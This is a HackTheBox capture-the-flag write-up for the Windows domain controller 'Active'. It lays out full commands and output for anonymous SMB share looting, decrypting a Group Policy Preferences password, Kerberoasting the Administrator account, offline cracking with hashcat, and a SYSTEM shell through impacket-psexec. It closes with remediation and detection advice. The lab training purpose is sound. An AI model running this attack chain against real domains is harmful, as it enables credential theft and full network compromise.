---
layout: default
title: "HackTheBox - Active"
---

# HackTheBox - Active

**OS:** Windows Server 2008 R2 (Active Directory)

Active is a Windows Domain Controller for `active.htb`. Anonymous SMB access to the `Replication` share exposes a Group Policy Preferences XML file containing an AES-encrypted password. Microsoft published the static decryption key in 2012, so `gpp-decrypt` recovers the plaintext in a single command. The service account credential from GPP grants authenticated domain access, and `impacket-GetUserSPNs` finds the Administrator account with an SPN registered, making it Kerberoastable. Hashcat cracks the TGS ticket offline, and `impacket-psexec` delivers a SYSTEM shell on the DC.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip> / domain controller` |
| Initial Access | GPP credential disclosure from readable SMB/SYSVOL data |
| Privilege Escalation | Kerberoasting a privileged account |
| Final Access | Domain Administrator / full domain compromise |

---

## Attack Path

1. Recon identified the exposed services and separated useful attack surface from noise.
2. The first break was GPP credential disclosure from readable SMB/SYSVOL data.
3. Post-exploitation enumeration exposed Kerberoasting a privileged account.
4. The final privileged context was reached and the required proof was captured.

---

## Recon

### Service Summary

| Port | Service | Notes |
|---|---|---|
| 53 | DNS | active.htb |
| 88 | Kerberos | Domain controller confirmed |
| 389 / 3268 | LDAP | Anonymous bind attempted |
| 445 | SMB | Null session allowed; Replication share readable |
| 5722 | MS-DFSR | DFS Replication service |

The port profile was a standard Windows DC. SMB was the obvious first target given null session authentication was allowed.

### Anonymous SMB Enumeration

Null session authentication succeeded. Listing shares as an anonymous user:

```bash
nxc smb <target-ip> -u '' -p '' --shares
```

```
SMB  <target-ip>  445  DC  [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB  <target-ip>  445  DC  [+] active.htb\:
SMB  <target-ip>  445  DC  Share        Permissions  Remark
SMB  <target-ip>  445  DC  -----        -----------  ------
SMB  <target-ip>  445  DC  ADMIN$                    Remote Admin
SMB  <target-ip>  445  DC  C$                        Default share
SMB  <target-ip>  445  DC  IPC$                      Remote IPC
SMB  <target-ip>  445  DC  Replication  READ
SMB  <target-ip>  445  DC  SYSVOL                    Logon server share
SMB  <target-ip>  445  DC  Users
```

`Replication` is a SYSVOL mirror used in older DFS replication setups. It often contains Group Policy files, including GPP preferences that may embed credentials. p0rtix spidered and downloaded the entire share using the NetExec `spider_plus` module with `DOWNLOAD_FLAG=True`:

```bash
nxc smb <target-ip> -u '' -p '' -M spider_plus \
  -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=./loot/smb MAX_FILE_SIZE=5000000
```

The manual equivalent using `smbclient`:

```bash
smbclient //<target-ip>/Replication -N -c "recurse; prompt off; mget *"
```

Both pull the share recursively into a local directory tree. `smbget -R smb://<target-ip>/Replication` is another option if `smbclient` is unavailable.

---

## Initial Access

### GPP Credential Disclosure

The downloaded share tree contained `Groups.xml` under the expected GPO path:

```
active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
        name="active.htb\SVC_TGS"
        changed="2018-07-18 20:46:06">
    <Properties action="U"
                cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
                userName="active.htb\SVC_TGS"
                neverExpires="1"
                acctDisabled="0"/>
  </User>
</Groups>
```

Group Policy Preferences let administrators push local account credentials through policy files. Microsoft encrypted these with AES-256 but published the static key in MSDN documentation in 2012. MS14-025 (CVE-2014-1812) patched the ability to create new GPP passwords, but any `cpassword` values already on disk remained readable and decryptable. `gpp-decrypt` implements the same key:

```bash
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```

```
GPPstillStandingStrong2k18
```

Confirming the credential authenticated:

```bash
nxc smb <target-ip> -u SVC_TGS -p 'GPPstillStandingStrong2k18' -d active.htb
```

```
SMB  <target-ip>  445  DC  [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
```

---

## Privilege Escalation

### Kerberoasting the Administrator Account

With valid domain credentials, `impacket-GetUserSPNs` enumerated all registered Service Principal Names:

```bash
impacket-GetUserSPNs active.htb/SVC_TGS:'GPPstillStandingStrong2k18' \
  -dc-ip <target-ip> -request -outputfile kerberoast.txt
```

```
ServicePrincipalName  Name           MemberOf
--------------------  -------------  --------------------------------------------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb
```

The `Administrator` account had an SPN set (`active/CIFS:445`). Any authenticated domain user can request a TGS for an SPN. The KDC issues a ticket encrypted with the service account's password hash, and that ticket can be cracked offline without any further interaction with the target. Assigning an SPN to a privileged account is a common misconfiguration that makes Kerberoasting immediately dangerous.

The `-request` flag pulled the TGS directly:

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$1914080d...
```

Hashcat mode 13100 covers RC4-encrypted Kerberoast hashes. Cracking against `rockyou.txt`:

```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

```
Ticketmaster1968
```

### SYSTEM Shell via PsExec

```bash
impacket-psexec active.htb/Administrator:'Ticketmaster1968'@<target-ip>
```

```
[*] Found writable share ADMIN$
[*] Uploading file miLiLPTf.exe
[*] Creating service aEqN on <target-ip>.....
[*] Starting service aEqN.....

C:\Windows\system32> whoami && hostname
nt authority\system
DC
```

Both flags:

```
C:\Windows\system32> type C:\Users\SVC_TGS\Desktop\user.txt
b5057b[...snip...]811b

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
b3d08f[...snip...]324
```

---

## Summary

Active chains two well-documented AD weaknesses: GPP credential disclosure and Kerberoasting. The GPP issue is over a decade old and still surfaces in environments where credentials were embedded before MS14-025 and never cleaned up. The Kerberoasting step demonstrates why high-privilege accounts should not carry SPNs: any domain user can request a TGS for the account and crack it offline with no alerts generated on the DC.

**Key takeaways:**

- Check all readable SMB shares for `Groups.xml` during recon. Any `cpassword` attribute decodes immediately with `gpp-decrypt`.
- MS14-025 blocks creating new GPP passwords but does not remove existing ones. Auditing and removing stale `cpassword` values from SYSVOL is a separate remediation step.
- Kerberoasting only requires valid domain credentials and produces offline-crackable ticket material. The target account receives no unusual log events during ticket request.
- High-privilege accounts should not have SPNs registered. Dedicate low-privilege service accounts to SPN assignment and enforce long, random passwords on them.

---

## Root Cause

The demonstrated path worked because legacy GPP credential storage, Kerberoastable privileged/service account, anonymous access to sensitive data or write paths, unpatched vulnerable software gave the attacker a bridge from reconnaissance to execution. The important pattern is the chain: GPP credential disclosure from readable SMB/SYSVOL data created a foothold, and Kerberoasting a privileged account converted that foothold into Domain Administrator / full domain compromise.

## Impact

Successful exploitation reached Domain Administrator / full domain compromise. That level of access allows command execution, proof or sensitive-file access, credential collection, and a realistic path to additional systems if the same credentials, services, or trust relationships exist elsewhere.

## Remediation

- Remove or harden the specific exposure used for initial access: GPP credential disclosure from readable SMB/SYSVOL data.
- Fix the privilege boundary that enabled escalation: Kerberoasting a privileged account.
- Audit AD privileges with BloodHound/PowerView and remove nonessential tier-0 rights.
- Rotate credentials observed or replayed during the chain and search for reuse on adjacent systems.
- Validate the fix by safely replaying the enumeration steps that originally exposed the weakness.

## Detection Opportunities

- Alert on exploit attempts or suspicious access patterns against the service that enabled initial access.
- Correlate successful authentication, new process creation, and privilege-boundary events after enumeration activity.
- Monitor for the specific escalation signal: Kerberoasting a privileged account.
- Collect and review Kerberos, LDAP, certificate, and directory-replication events for nonstandard principals.

## Lessons Learned

- The winning path was not just a vulnerable service; it was the connection between GPP credential disclosure from readable SMB/SYSVOL data and Kerberoasting a privileged account.
- Preserve the observations that explain why each pivot made sense, not only the commands that worked.
- Write remediation from the root cause of each step so the report reads like an operator narrative and a defender action plan.
